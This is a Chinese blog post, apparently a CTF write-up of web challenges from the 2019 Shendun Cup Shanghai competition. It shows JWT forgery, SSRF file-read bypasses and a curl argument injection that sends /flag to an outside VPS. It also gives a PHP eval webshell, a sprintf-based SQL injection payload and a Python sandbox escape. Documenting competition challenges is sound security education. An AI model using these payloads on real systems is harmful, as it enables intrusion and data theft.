<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="ctf"><meta name="keywords" content="ctf"><meta name="author" content="Somnus"><meta name="copyright" content="Somnus"><title>2019 &quot;神盾杯&quot;上海市网络空间安全竞赛 Web部分题解 | Somnus's blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#easyadmin"><span class="toc-number">1.</span> <span class="toc-text">easyadmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-gallery-1"><span class="toc-number">2.</span> <span class="toc-text">ez_gallery_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-gallery-2"><span class="toc-number">3.</span> <span class="toc-text">ez_gallery_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyupload"><span class="toc-number">4.</span> <span class="toc-text">easyupload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easysqli"><span class="toc-number">5.</span> <span class="toc-text">easysqli</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fast-calc-2"><span class="toc-number">6.</span> <span class="toc-text">fast_calc_2</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Somnus</div><div class="author-info__description text-center">与其哀叹，不如埋头苦干</div><div class="follow-button"><a href="https://Nikoeurus.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">87</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">16</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">26</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">七月火</a><a class="author-info-links__name text-center" href="https://zhzhdoai.github.io" target="_blank" rel="noopener">osword</a><a class="author-info-links__name text-center" href="https://glotozz.github.io/" target="_blank" rel="noopener">glotozz</a><a class="author-info-links__name text-center" href="http://dkk.ink" target="_blank" rel="noopener">dkk</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/background.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Somnus's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">2019 &quot;神盾杯&quot;上海市网络空间安全竞赛 Web部分题解</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-06-14</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/">ctf</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>考试月抽空打了一下，收获挺大的，做个记录赶紧复习去了<a id="more"></a></p>
<h3 id="easyadmin"><a href="#easyadmin" class="headerlink" title="easyadmin"></a>easyadmin</h3><p>抓包发现jwt</p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/1.png" alt=""></p>
<p>HS256加密，找到密钥即可伪造，用工具爆破密钥即可</p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/2.png" alt=""></p>
<p>密钥是<strong>sjwt</strong></p>
<p>伪造角色字段role值为admin</p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/3.png" alt=""></p>
<p>再登陆即可获得flag</p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/4.png" alt=""></p>
<p> c-jwt-crack下载地址:<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker</a></p>
<h3 id="ez-gallery-1"><a href="#ez-gallery-1" class="headerlink" title="ez_gallery_1"></a>ez_gallery_1</h3><p>html源码里有提示<code>&lt;?php $flag=&#39;flag in the /flag&#39;;?&gt;</code></p>
<p><code>http://xxxx/gallery.php?path=http://127.0.0.1:8082/gallery/static/img/portfolio-1.jpg</code></p>
<p>猜测是<strong>ssrf</strong>漏洞，直接利用file协议读/flag：<code>?path=file:///flag</code>读不出来</p>
<p>于是就在自己的vps上随便写一个php文件来读：<code>?path=http://vps/phpinfo.php</code>，发现读不出来</p>
<p>但是读一个jpg图片可以：<code>?path=http://vps/1.jpg</code></p>
<p>所以就怀疑是不是对<strong>path</strong>参数做了检测，必须带有后缀名<strong>.jpg</strong></p>
<p>于是就访问<code>?path=http://vps/phpinfo.php%23.jpg</code>，发现成功访问，<code>%23</code>代表<code>#</code>后面的<code>.jpg</code>自然不会传入后台代码</p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/16.png" alt=""></p>
<p>于是访问<code>?path=file:///flag%23.jpg</code>就能拿到flag了</p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/15.png" alt=""></p>
<h3 id="ez-gallery-2"><a href="#ez-gallery-2" class="headerlink" title="ez_gallery_2"></a>ez_gallery_2</h3><p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/17.png" alt=""></p>
<p>过滤了file协议，貌似只能用<strong>http</strong>和<strong>https</strong>协议，那么我们就利用http协议来访问自己的vps，在自己监听端口</p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/18.png" alt=""></p>
<p>发现服务器是通过<strong>curl</strong>来访问的</p>
<p>那么我们就可以利用<strong>curl -d</strong>命令来构造<strong>POST</strong>请求包获得数据：</p>
<p><code>?f=http://120.77.180.97:8888/index.php%20-d%201%23.jpg</code></p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/19.png" alt=""></p>
<p>于是尝试：<code>?f=http://120.77.180.97:8888/index.php%20-d%20/flag%23.jpg</code></p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/20.png" alt=""></p>
<p>没有获得到flag，但是我们还能使用<code>curl -F</code>命令，<code>-F</code>参数能够传输文件，具体格式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -F &quot;file=@__FILE_PATH__&quot;</span><br></pre></td></tr></table></figure>

<p>于是构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=http://120.77.180.97:8888/index.php%20-F%20myflag=@/flag%20-F%20x=1%23.jpg</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/21.png" alt=""></p>
<p>成功读取到了/flag文件</p>
<h3 id="easyupload"><a href="#easyupload" class="headerlink" title="easyupload"></a>easyupload</h3><p>发现上传检查了文件内容，文件内容加上<strong>GIF89A</strong>即可上传木马，但是上传后没有回显文件地址，只有base64加密的文件内容</p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/5.png" alt=""></p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/6.png" alt=""></p>
<p>page参数有包含，但是过滤了<strong>://</strong>，所以我们就不能用伪协议来读取源码了</p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/7.png" alt=""></p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/8.png" alt=""> </p>
<p>我们可以发现上传的包中还有另一个参数<code>picurl</code>，这个参数在上传页面中对应的是<strong>上传在线图片</strong></p>
<p>我们试着输入一个在线图片地址</p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/9.png" alt=""></p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/10.png" alt=""></p>
<p>发现上传成功，那么能不能用file协议读文件呢，试一下<code>file:///etc/passwd</code></p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/26.png" alt=""></p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/11.png" alt=""></p>
<p>但是上传其他文件，例如file:///var/www/html/index.php是<strong>没有重定向</strong>的，说明没有上传成功，所以猜测可能是过滤了<code>var</code>关键字</p>
<p>所以通过特殊目录<code>file:///proc/self/cwd/index.php</code>来获得index.php文件，<code>/proc</code>目录与<strong>当前进程相关</strong>，<code>self</code>代表<strong>当前进程</strong>，<code>cwd</code>则代表<strong>软链接</strong>，所以能直接指向<strong>apache的根目录</strong></p>
<p>获得的index.php源码如下：</p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/12.png" alt=""></p>
<p>upload.php源码如下：</p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/13.png" alt=""></p>
<p>从源码中我们可以获得上传路径，关键代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ddir=<span class="string">"./upload_u_c4nt_acc3ss/"</span>;</span><br><span class="line">$name=$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>];</span><br><span class="line">$ext = pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">$filename=basename($name,$ext);</span><br><span class="line">$rootpath=$ddir.md5($filename).<span class="string">"."</span>.$name;</span><br></pre></td></tr></table></figure>

<p>利用我们前面提到的加上<strong>GIF89A</strong>后上传的马和获得的上传路径，我们就可以直接访问到我们上传的马，但是这里还需要注意代码中对上传的php文件内容有一处过滤，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^ph(.*)$/i'</span>,$ext))&#123;</span><br><span class="line">    <span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>,<span class="string">'phps'</span>])) &#123;</span><br><span class="line">        file_put_contents($rootpath,preg_replace(<span class="string">"/\?/"</span>,<span class="string">""</span>,file_get_contents($rootpath)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>既然去掉了<code>?</code>那么，我们就不能使用<code>&lt;?php ?&gt;</code>标签，所以文件内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&apos;php&apos;&gt;@eval($_GET[_]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>上传后直接访问即可执行命令</p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/14.png" alt=""></p>
<h3 id="easysqli"><a href="#easysqli" class="headerlink" title="easysqli"></a>easysqli</h3><p><strong>user</strong>参数和<strong>pass</strong>参数都经过<code>addslashes</code>函数过滤，题目也给出了提示要绕过<code>addslashes</code>函数</p>
<p>后台对输入的用户名开头检查，必须是<strong>admin</strong>开头，对sql的执行结果有回显</p>
<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/22.png" alt=""></p>
<p>但是普通的方法，例如宽字节注入，base64，url编码都尝试了无法绕过，所以只能考虑用sprintf字符串格式化漏洞来绕过，参考：<a href="https://blog.csdn.net/weixin_41185953/article/details/80485075" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/80485075</a> </p>
<p>猜测后台代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$user = addslashes($_GET[<span class="string">'user'</span>]);</span><br><span class="line">$pass = addslashes($_GET[<span class="string">'pass'</span>]);</span><br><span class="line">$sql = sprintf(<span class="string">"select * from users where username='%s' and password='$pass'"</span>,$user);</span><br></pre></td></tr></table></figure>

<p>简单的说，<strong>sprintf字符串漏洞</strong>思想为：<strong>%后的一个字符都会被当作字符型类型而被吃掉</strong>，也就是被当作一个类型进行匹配后面的变量，比如%c匹配asciii码，%d匹配整数，如果不在定义的也会匹配，匹配空，比如%\，<strong>这样我们的目的只有一个，使得单引号逃逸，也就是能够起到闭合的作用</strong>。 </p>
<p>也就是说，如果pass字段带有<strong>%\</strong>，那么php会把\当作一个格式化字符的类型而吃掉, 最后%\（或<strong>%1$\</strong>）被替换为空 </p>
<p>所以最终payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/result.php?user=admin&amp;pass=%251$%27%20or%201%23&amp;pow=01cc6dc</span><br></pre></td></tr></table></figure>

<p>拼凑起来的sql语句就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&apos;admin&apos; and password=&apos;%1$\&apos; or 1#&apos;;</span><br></pre></td></tr></table></figure>

<p>由于php把<code>%1$\</code>当作是格式字符，由于匹配不到值，所以替换为空，造成了<code>\</code>后面的单引号逃逸，最终执行的sql语句为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&apos;admin&apos; and password=&apos;&apos; or 1#&apos;;</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/23.png" alt=""></p>
<h3 id="fast-calc-2"><a href="#fast-calc-2" class="headerlink" title="fast_calc_2"></a>fast_calc_2</h3><p>根据源代码中的js文件：script.js</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function my_eval(expr)&#123;</span><br><span class="line"></span><br><span class="line">    data = &#123;&quot;target&quot;:&quot;/&quot;,&quot;expr&quot;:expr&#125;</span><br><span class="line"></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">            type: &quot;POST&quot;,</span><br><span class="line">            url: &quot;/calc.php&quot;,</span><br><span class="line">            data: JSON.stringify(data),</span><br><span class="line">            contentType: &apos;application/json&apos;,</span><br><span class="line">            dataType: &quot;json&quot;</span><br><span class="line">    &#125;).done(function( data ) &#123;</span><br><span class="line">        form.panel.value =  data[&apos;result&apos;];</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造发送至calc.php文件的POST数据包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /calc.php HTTP/1.1</span><br><span class="line">Host: 7666e36272ac45adba86f08bb486ef6d28ce4c7a1a184a8a.changame.ichunqiu.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: UM_distinctid=16a87ef281d7e4-0f82ca74b9fe99-f353163-144000-16a87ef281e5ea; pgv_pvi=3457772544; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1558713312,1558797925,1559201555,1560385043; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1560481298; __jsluid=108fcbbfcc938a7f03a3f133bc6b93fc</span><br><span class="line">If-None-Match: &quot;1023-58a7ac584a100-gzip&quot;</span><br><span class="line">If-Modified-Since: Tue, 04 Jun 2019 07:53:08 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;&quot;target&quot;:&quot;/&quot;,&quot;expr&quot;:&quot;1+1&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/24.png" alt=""></p>
<p>发现存在<strong>SSTI</strong>，但是过滤了<code>[]</code>，<code>__base__</code>，<code>__subclasses__</code></p>
<p>测了一下当 <strong>open</strong> 紧跟着刮号时会被拦，用一个空格隔开，然后就可以任意读文件了…盲猜 flag 在根目录 </p>
<p>payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;target&quot;:&quot;/&quot;,&quot;expr&quot;:&quot;open (&apos;/flag&apos;).__getattribute__(&apos;read&apos;)()&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/%E7%A5%9E%E7%9B%BE%E6%9D%AF/25.png" alt=""></p>
<p>查看源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open (&apos;/proc/self/cwd/calc.php&apos;).__getattribute__(&apos;read&apos;)()</span><br></pre></td></tr></table></figure>

<p>calc.php：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$data = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$data = json_decode($data,true);</span><br><span class="line">$encode_data = base64_encode($data[&apos;expr&apos;]);</span><br><span class="line"></span><br><span class="line">system(&apos;python ./final.py &apos;.$encode_data);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open (&apos;/proc/self/cwd/final.py&apos;).__getattribute__(&apos;read&apos;)()</span><br></pre></td></tr></table></figure>

<p>final.py：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> pythonapi,POINTER,py_object</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    input = b64decode(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">except</span> Exception,e:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'&#123;"success":500,"result": "%s"&#125;'</span> %str(e)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> sys,b64decode</span><br><span class="line"></span><br><span class="line">_get_dict = pythonapi._PyObject_GetDictPtr</span><br><span class="line">_get_dict.restype = POINTER(py_object)</span><br><span class="line">_get_dict.argtypes = [py_object]</span><br><span class="line"><span class="keyword">del</span> pythonapi,POINTER,py_object</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dictionary_of</span><span class="params">(ob)</span>:</span></span><br><span class="line">    dptr = _get_dict(ob)</span><br><span class="line">    <span class="keyword">return</span> dptr.contents.value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span><span class="params">()</span>:</span></span><br><span class="line">    UNSAFE = [</span><br><span class="line">              <span class="string">'file'</span>,</span><br><span class="line">              <span class="string">'execfile'</span>,</span><br><span class="line">              <span class="string">'reload'</span>,</span><br><span class="line">              <span class="string">'__import__'</span>,</span><br><span class="line">              <span class="string">'eval'</span>,</span><br><span class="line">              <span class="string">'input'</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(string)</span>:</span></span><br><span class="line">    black_list = [<span class="string">'eval('</span>,<span class="string">'exec('</span>,<span class="string">'open('</span>,<span class="string">'read('</span>,<span class="string">'system('</span>,<span class="string">'['</span>,<span class="string">']'</span>]</span><br><span class="line">    <span class="keyword">for</span> black_word <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black_word <span class="keyword">in</span> string:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"Black words"</span>)</span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"><span class="comment"># Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"></span><br><span class="line"><span class="comment"># more secure</span></span><br><span class="line">type_dict = dictionary_of(type)</span><br><span class="line"><span class="keyword">del</span> type_dict[<span class="string">"__base__"</span>]</span><br><span class="line"><span class="keyword">del</span> type_dict[<span class="string">"__subclasses__"</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line"></span><br><span class="line">    <span class="keyword">exec</span> <span class="string">'a='</span> + filter(input)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'&#123;"success":200,"result": "%s"&#125;'</span>%a</span><br><span class="line"><span class="keyword">except</span> Exception, e:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'&#123;"success":500,"result": "%s"&#125;'</span> %str(e)</span><br></pre></td></tr></table></figure>

<p>几个常用payload的内建函数被删了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">del type_dict[&quot;base&quot;]</span><br><span class="line"></span><br><span class="line">del type_dict[&quot;subclasses&quot;]</span><br><span class="line"></span><br><span class="line">def make_secure():</span><br><span class="line"></span><br><span class="line">  UNSAFE = [</span><br><span class="line"></span><br><span class="line">      &apos;file&apos;,</span><br><span class="line"></span><br><span class="line">      &apos;execfile&apos;,</span><br><span class="line"></span><br><span class="line">      &apos;reload&apos;,</span><br><span class="line"></span><br><span class="line">      &apos;import&apos;,</span><br><span class="line"></span><br><span class="line">      &apos;eval&apos;,</span><br><span class="line"></span><br><span class="line">      &apos;input&apos;]</span><br><span class="line"></span><br><span class="line">  for func in UNSAFE:</span><br><span class="line"></span><br><span class="line">    del builtins.dict[func]</span><br></pre></td></tr></table></figure>



</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" target="_blank" rel="noopener">Somnus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nikoeurus.github.io/2019/06/14/2019%E2%80%9C%E7%A5%9E%E7%9B%BE%E6%9D%AF%E2%80%9Dctf-Web/">https://nikoeurus.github.io/2019/06/14/2019%E2%80%9C%E7%A5%9E%E7%9B%BE%E6%9D%AF%E2%80%9Dctf-Web/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Nikoeurus.github.io">Somnus's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/08/30/OGeek-wp/"><i class="fa fa-chevron-left">  </i><span>2019 ogeek线上赛部分题解WriteUp</span></a></div><div class="next-post pull-right"><a href="/2019/05/29/%E4%B8%8D%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/"><span>不含数字和字母的webshell</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'piszMlsB7MhecwDRlz0IFCop-gzGzoHsz',
  appKey:'PHmvwpbyTPCcD3D52L1CoTlp',
  placeholder:'Just go go',
  avatar:'wavatar',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(/img/background.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2019 By Somnus</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script 